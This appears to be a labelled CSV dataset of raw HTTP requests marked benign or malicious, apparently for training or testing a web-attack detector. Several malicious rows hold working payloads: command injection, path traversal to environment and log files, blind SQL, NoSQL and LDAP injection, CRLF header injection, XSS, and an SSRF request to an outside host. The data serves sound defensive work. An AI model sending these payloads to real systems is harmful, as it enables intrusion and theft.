label,text
benign,"GET /docs/manuals/setup-guide.pdf HTTP/1.1
Host: corporate-it-resources.biz
Accept: application/pdf
Accept-Language: en-US
Referer: https://office-support-portal.org/account/settings
Connection: keep-alive
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15"
benign,"DELETE /api/v1/blog/posts/23789 HTTP/1.1
Host: community.game-dev-forum.org
Authorization: Bearer mnbvcxzlkjhgfdsapoiuytrewq123456
If-Match: ""92abd4e""
Accept: application/vnd.api+json
Referer: https://community.game-dev-forum.org/blog/posts/23789
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15
Connection: keep-alive"
benign,"GET /search_results?q=top+rated+hiking+backpacks+2024 HTTP/1.1
Host: trail-questing.ai
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: text/html
Referer: https://trail-questing.ai/articles/outdoor-gear
Connection: keep-alive
DNT: 1"
benign,"PUT /api/v1/accounts/profiles/87921 HTTP/1.1
Host: secure.profile-portal.net
Authorization: Bearer VXNlck1hbmFnZXI6MjUxOQ==
Content-Type: application/xml
Accept: application/xml
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0
Accept-Encoding: gzip, br
DNT: 1
Connection: keep-alive
Content-Length: 178

<ProfileUpdate>
  <ProfileID>87921</ProfileID>
  <DisplayName>Jordan Miles</DisplayName>
  <NotificationSettings>
    <EmailNotifications>false</EmailNotifications>
    <PushNotifications>true</PushNotifications>
  </NotificationSettings>
  <PreferredLanguage>fr-FR</PreferredLanguage>
</ProfileUpdate>"
benign,"PUT /api/v1/accounts/42089/profile HTTP/1.1
Host: financial-clearance-service.biz
Authorization: Bearer eX8pwfHxEoaDqYVlKJ7IGsl9MrVz4nBWu0ytXpPcq
Content-Type: application/json
Accept: application/json
User-Agent: Python-urllib/3.11
Accept-Encoding: identity
Content-Length: 176

{""accountId"":42089,""fullName"":""Jamal Richardson"",""email"":""jamal.richardson@fin-clearance.biz"",""phone"":""+1-303-555-8932"",""address"":{""street"":""909 Corporate Plaza"",""city"":""Austin"",""state"":""TX"",""zip"":""78746"",""country"":""USA""}}"
benign,"OPTIONS /products/electronics/tv/details HTTP/1.1
Host: online-retail-store.biz
Origin: https://analytics.finance-dashboard.solar
Access-Control-Request-Method: GET
User-Agent: curl/7.83.1
Accept: */*
Connection: keep-alive"
benign,"GET /gallery/image/view?comment=This%20is%20%26lt%3Bbold%26gt%3B HTTP/1.1
Host: creative-arts-gallery.co
User-Agent: python-requests/2.28.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
X-Forwarded-For: 198.51.100.23"
malicious,"GET /service/status/device123%20%7C%20hostname%20%7C%20whoami HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: close"
benign,"GET /api/v1/vehicles/registration/AB123CD HTTP/1.1
Host: city-transport-services.org
Accept: application/json
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Authorization: Bearer g7ht6y5r4e3w2q1p0o9n8m7k6j5h4g3f2d1s0
Accept-Language: en-US,en;q=0.5
Connection: keep-alive"
malicious,"POST /submit/form HTTP/1.1
Host: secure-login-hub.org
User-Agent: Mozilla/5.0 (compatible; CustomAgent/2.1; +http://crawler.newsite.ai) $(whoami)
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.5

username=testuser&password=1234"
malicious,"GET /registration/validate?username=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab HTTP/1.1
Host: login-gateway.cloud-services.ai
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cache-Control: max-age=0
Connection: close"
benign,"GET /media/scripts/map-interactions.min.js HTTP/1.1
Host: travel-horizons.net
User-Agent: Go-http-client/1.1
Accept: application/javascript, */*;q=0.1
Accept-Language: en-US,en;q=0.8
If-None-Match: ""a7b3c5d7f9""
Connection: keep-alive"
benign,"GET /checkout/cart HTTP/1.1
Host: shopwise-marketplace.org
Accept: text/html,application/xhtml+xml,application/xml
DNT: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36
Cache-Control: max-age=0
Cookie: session_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.xxx.xxx
Connection: keep-alive"
malicious,"GET /member/check?member_id=acc_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Wget/1.20
Accept: */*
Accept-Language: en-US,en;q=0.8
Upgrade-Insecure-Requests: 1"
benign,"POST /user/accounts/password/reset HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/json
Accept: application/json
DNT: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Connection: close
Content-Length: 56

{""email"":""jacob.sanders1984@online-retail-store.biz""}"
benign,"GET /uploads/products/outdoor/camping-stove-top-view.png HTTP/1.1
Host: api.cloud-data-services.ai
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: https://api.cloud-data-services.ai/products/outdoor/camping-stove
User-Agent: curl/7.83.1
Connection: close"
benign,"GET /images/gallery/nature/waterfall-spring-2023.png HTTP/1.1
Host: photo-archive-collector.org
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: image/png,image/*,*/*;q=0.8
Range: bytes=0-1023
Connection: keep-alive"
benign,"GET /articles/2024/05/benefits-of-electric-vehicles HTTP/1.1
Host: urban-mobility-trends.tech
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: text/html
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive"
benign,"POST /api/v3/user/settings/save HTTP/1.1
Host: portal.interactive-learning.ai
Authorization: Bearer Qx2p84m8Z8NyJz7EEM4G
Content-Type: application/json
Content-Length: 64
Idempotency-Key: b12a4679-8a73-4e8a-820b-9125d998d2cb
X-Request-ID: 0049fed2-9d20-43eb-bc17-c10e07a5d7a5
X-Client-Version: 0.9.8
Accept: application/json
Cache-Control: no-cache
User-Agent: curl/7.76.1

{""userId"":88001,""settings"":{""language"":""fr"",""notifications"":false}}"
benign,"POST /user/signup HTTP/1.1
Host: api.cloud-data-services.ai
Accept: application/json
Content-Type: application/json
Origin: https://api.cloud-data-services.ai
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G996U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Mobile Safari/537.36
Content-Length: 123
Connection: keep-alive

{""username"":""elena_rivera"",""email"":""elena.r@cloud-data-services.ai"",""password"":""CloudSync#987"",""dateOfBirth"":""1993-07-18""}"
benign,"POST /beacon/track HTTP/1.1
Host: metrics.real-time-analytics.ai
Content-Type: text/plain
Origin: https://dashboard.real-time-analytics.ai
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Length: 34
Connection: close

event=page_view&url=/home/dashboard"
malicious,"POST /api/v1/account/login HTTP/1.1
Host: login.online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Referer: https://online-retail-store.biz/login
Content-Length: 59

username=shopper%00%01<script>eval(String.fromCharCode(97,108,101,114,116(49)))</script>&password=secretPass123"
benign,"OPTIONS /v1/analytics/report/generate HTTP/1.1
Host: analytics.bigdata-hub.cloud
Origin: https://portal.analytics-hub.net
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type, authorization
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: */*
Connection: close"
malicious,"GET /public/avatars/..%2F..%2F..%2F..%2Fproc/self/environ HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"GET /news/%D0%BD%D0%BE%D0%B2%D0%BE%D1%81%D1%82%D0%B8 HTTP/1.1
Host: globalview-info.org
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.7,en;q=0.5
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36
Accept-Encoding: gzip, deflate, br"
benign,"GET /api/v1/metadata?url=https%3A%2F%2Fxtechcloudservices.io%2Fdocs%2Fsubmitted%2Fform-245 HTTP/1.1
Host: api.xtechcloudservices.io
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.124 Safari/537.36
Accept-Encoding: gzip, deflate, br
Referer: https://dashboard.xtechcloudservices.io/home
Connection: keep-alive"
benign,"GET /reports/daily/status?date=2024-03-18 HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Python-urllib/3.10
Accept: application/json
Referer: https://dashboard-cloud-app.net/home
Connection: close"
malicious,"GET /orders/12345%0d%0aX-Payload-Test:%20enabled%0d%0aContent-Length:%2025%0d%0a%0d%0a<script>console.log('xss')</script> HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15
Accept: text/html,application/xhtml+xml
Accept-Language: en-US
Upgrade-Insecure-Requests: 1"
malicious,"POST /api/v1/user/settings HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/json
Accept: application/json
Content-Length: 181
User-Agent: Python-urllib/3.9

{""user_id"": ""58731"", ""contact_email"": ""contact@my-personal-blog-site.info"", ""signature_link"": ""\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0058\u0053\u0053\u0027\u0029""}"
benign,"POST /upload HTTP/1.1
Host: creative-works.archive-media.art
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15
Accept: image/avif,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: br, gzip, deflate
Connection: keep-alive
Content-Type: multipart/form-data; boundary=----BoundaryAlpha123
Content-Length: 386
Origin: https://creative-works.archive-media.art
Referer: https://creative-works.archive-media.art/users/upload
Cookie: session=eyJwYXJ0IjoiZGFzaGJvYXJkIn0

------BoundaryAlpha123
Content-Disposition: form-data; name=""document""; filename=""portfolio_submission.pdf""
Content-Type: application/pdf

%PDF-1.6
% Minimal PDF content placeholder
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
------BoundaryAlpha123
Content-Disposition: form-data; name=""project_name""

Art Portfolio Spring 2024
------BoundaryAlpha123
Content-Disposition: form-data; name=""comments""

Looking forward to feedback.
------BoundaryAlpha123--"
benign,"GET /media/img/icons/favicon-192x192.png HTTP/1.1
Host: secure-user-portal.net
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: https://secure-user-portal.net/login
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept-Language: en-US,en;q=0.7
Connection: keep-alive"
benign,"GET /api/items/list?nextPage=ZXJkaW5nMTIzNA==&filters=eyJjYXRlZ29yeSI6ICJlY3Ryb25pY3MiLCAicHJpY2UiOiB7Im1pbiI6IDUwLCAibWF4IjogMTAwMH19 HTTP/1.1
Host: marketplace-data.io
Accept: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.64 Safari/537.36
Referer: https://app.marketplace-data.io/dashboard
Connection: keep-alive"
malicious,"GET /config/load?path=..%c0%af..%c0%af..%c0%afapache%c0%aflogs%c0%aferror.log HTTP/1.1
Host: web-services-suite.net
User-Agent: Python-urllib/3.9
Accept-Encoding: identity
Accept-Charset: utf-8, iso-8859-1;q=0.5
Connection: close"
malicious,"POST /user/find HTTP/1.1
Host: memberportal.community-network.org
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: application/json
Content-Type: application/json
Content-Length: 89
Connection: keep-alive

{""searchFilter"":""(cn=test_user)(objectClass=user))(|(uid=administrator)""}"
benign,"GET /blog/article/view/5592 HTTP/1.1
Host: my-personal-blog-site.info
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.6
Referer: https://my-personal-blog-site.info/blog/rss
Cookie: visitor_id=dc12b9a7-55e8-40e3-b349-42af615e7a9a; theme=light
DNT: 1
Sec-CH-UA: ""Safari"";v=""16"", ""Not A(Brand"";v=""99"", ""Apple"";v=""16""
Sec-CH-UA-Mobile: ?1
Sec-CH-UA-Platform: ""iOS"""
benign,"GET /news/%ED%95%9C%EA%B5%AD%EC%96%B4 HTTP/1.1
Host: seoul-report.kr
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
Connection: keep-alive
Cache-Control: max-age=0"
benign,"GET /scripts/app.bundle.js HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/112.0
Accept: application/javascript, text/javascript, */*;q=0.1
If-None-Match: ""4e3f8a7b""
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"GET /api/v3/users?role=editor&active=true&created_before=2023-12-31 HTTP/1.1
Host: user-management.labcloud.ai
Accept: application/json
User-Agent: curl/7.88.1
Accept-Encoding: gzip, deflate, br
Authorization: Basic dXNlcjRAZG9tYWluLmNvbTpwYXNzd29yZA=="
benign,"POST /api/v4/notifications/send HTTP/1.1
Host: alerts.social-connect.io
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Accept: application/json
Accept-Language: en-US,en;q=0.9
Content-Type: application/json
Content-Length: 120
Connection: keep-alive

{""userId"":""482b7e12"",""messages"":[""Your profile update was successful."",""New login from Chrome browser detected."",""Weekly summary is ready to view.""]}"
malicious,"GET /search HTTP/1.1
Host: gadgettrendsworld.org
User-Agent: curl/7.77.0
Accept: */*
Cookie: lang=en-US; tracking_id=xyz'%20OR%20IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=97, SLEEP(5),0)#
Cache-Control: max-age=0"
benign,"POST /upload/avatar HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Referer: https://my-personal-blog-site.info/settings/avatar
Content-Type: multipart/form-data; boundary=----BoundaryAvatar123
Content-Length: 280

------BoundaryAvatar123
Content-Disposition: form-data; name=""file""; filename=""profile_pic.png""
Content-Type: image/png

(binary PNG image content benign placeholder)
------BoundaryAvatar123--"
malicious,"POST /api/v2/user/search HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Content-Type: application/json
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Origin: https://secure-user-portal.net
Referer: https://secure-user-portal.net/app/user/search
Connection: keep-alive

{""query"":{""$where"":""this.username == 'admin' && this.password.startsWith('a') || sleep(5000)""}}"
benign,"GET /docs/api/openapi.json HTTP/1.1
Host: media-service-api.net
Accept: application/json
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Connection: close"
benign,"GET /community/discussions/thread/4589?page=2 HTTP/1.1
Host: dev-forum-archive.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: https://dev-forum-archive.net/community/discussions
Cache-Control: max-age=0"
benign,"PUT /api/events/55991 HTTP/1.1
Host: community.game-dev-forum.org
Authorization: Bearer kjHgfEwRtuYZXmNpLoQweAsDfRt45678UioPqweRt
Accept: application/xml
Content-Type: application/xml
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
DNT: 1
Content-Length: 143

<Event><id>55991</id><name>Monthly Dev Meetup</name><date>2024-07-07</date><location>Virtual Conference Room</location></Event>"
malicious,"POST /api/v1/notifications/subscribe HTTP/1.1
Host: data-sync-service.secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.9
Content-Type: application/json
X-Notification-Endpoint: http://dynamic-rebind-attack.net/api/ping
Cookie: sessionid=3f8d9e2a7cbb1e6b4a2d9c5e7f1b8a2c
Content-Length: 58

{""userId"":12345,""subscriptionType"":""email"",""enabled"":true}"
malicious,"POST /user/settings/update HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36""><svg/onload=eval(atob('YWxlcnQoJ1NldHRpbmcgQXR0YWNrJyk='))>
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: https://online-retail-store.biz
Referer: https://online-retail-store.biz/user/settings
Connection: keep-alive

email=jane.doe%40mailservice.com"
benign,"GET /catalog/items?data=%7B%22filter%22%3A%22active%22%7D HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Referer: https://online-retail-store.biz/shop
Connection: keep-alive
X-CSRF-Token: d41d8cd98f00b204e9800998ecf8427e"
malicious,"GET /devices/diagnose/router-88%20%7C%20hostname%20%7C%20whoami HTTP/1.1
Host: edge-networking-solutions.top
User-Agent: Mozilla/5.0 (iPad; CPU OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: keep-alive"
